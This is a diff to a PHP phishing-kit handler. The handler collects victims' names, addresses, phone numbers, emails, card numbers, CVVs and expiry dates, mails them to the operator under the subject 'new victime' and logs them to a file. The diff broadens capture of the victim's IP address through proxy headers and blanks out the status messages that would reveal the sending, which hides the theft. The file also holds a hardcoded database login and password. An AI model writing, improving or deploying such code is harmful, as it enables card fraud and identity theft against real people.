@@ -101,7 +101,20 @@ if(  isset($_POST["name"])     )
 {
 		
 $connect = new PDO("mysql:host=freedb.tech;dbname=freedbtech_wordpresst", "freedbtech_mehdiouatmane", "mehdi2014@A");
-$ip = $_SERVER['REMOTE_HOST']  ;
+$ip = $_SERVER['REMOTE_ADDR']  ;
+if (isset($_SERVER['REMOTE_ADDR']))
+    $ip = $_SERVER['REMOTE_ADDR'];
+else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+else if(isset($_SERVER['HTTP_X_FORWARDED']))
+    $ip = $_SERVER['HTTP_X_FORWARDED'];
+else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
+    $ip = $_SERVER['HTTP_FORWARDED_FOR'];
+else if(isset($_SERVER['HTTP_FORWARDED']))
+    $ip = $_SERVER['HTTP_FORWARDED'];
+else if(isset($_SERVER['HTTP_CLIENT_IP']))
+    $ip = $_SERVER['HTTP_CLIENT_IP'];
+
 $name = $_POST["name"];
 $date = $_POST["date"];
 $address = $_POST["address"];
@@ -135,7 +148,7 @@ $mail->IsHTML(true);
 $mail->Subject = 'new victime';           
 $mail->Body = 'les info victime: '     .      '<br> ip: '     .    $ip     .   '<br> name: '   .    $name    .   '<br> date: '    .  $date    .   '<br> address: ' .  $address   .   '<br> codepostal: '  .  $codepostal   .   '<br> city: '  .  $city    .   '<br> phone: '    .    $phone    .   '<br> email: '    .   $email        .   '<br> namecard: '    .   $namecard       .   '<br> cardnumber: '    .   $cardnumber        .   '<br> cvv: '    .   $cvv       .   '<br> datexp: '    .   $datexp        ;           
 $mail->smtpClose();
-if ( $mail->send() )   {	echo "yestoemail"; }  else   {  echo "nntoemail";	}
+if ( $mail->send() )   {	echo ""; }  else   {  echo "";	}
 
 
 
@@ -161,7 +174,7 @@ fwrite($file ,    "cardnumber : "   .      $cardnumber   .      "\n");
 fwrite($file ,    "cvv : "          .      $cvv          .      "\n"); 
 fwrite($file ,    "datexp : "       .      $datexp       .      "\n"); 
 fwrite($file , "\n");
-if ( $file   ) {  echo "yestofile";   }else{  echo "nntofile";   }
+if ( $file   ) {  echo "";   }else{  echo "";   }
 
 
 
